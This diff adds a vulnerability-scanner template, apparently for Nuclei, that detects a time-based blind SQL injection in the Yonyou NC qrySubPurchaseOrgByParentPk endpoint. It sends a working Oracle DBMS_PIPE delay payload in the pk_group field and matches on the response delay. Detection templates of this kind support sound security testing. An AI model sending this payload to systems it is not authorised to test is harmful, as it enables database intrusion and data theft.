@@ -1,0 +1,30 @@
+id: yonyou-nc-qrysubpurchaseorg-sqli
+
+info:
+  name: 用友NC - qrySubPurchaseOrgByParentPk SQL注入漏洞
+  author: onewin
+  severity: high
+  description: |
+    用友NC系统的qrySubPurchaseOrgByParentPk接口存在SQL注入漏洞，攻击者可通过时间盲注技术获取数据库敏感信息
+  reference: UFIDA-2025-059739
+  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud
+
+http:
+  - method: POST
+    path: 
+      - "{{BaseURL}}/ebvp/register/qrySubPurchaseOrgByParentPk"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "pk_group=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',3) --"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=3 && duration<8"
+          - "status_code == 200"
+        condition: and
+      - type: word
+        words:
+          - "[]"
+        condition: and
+
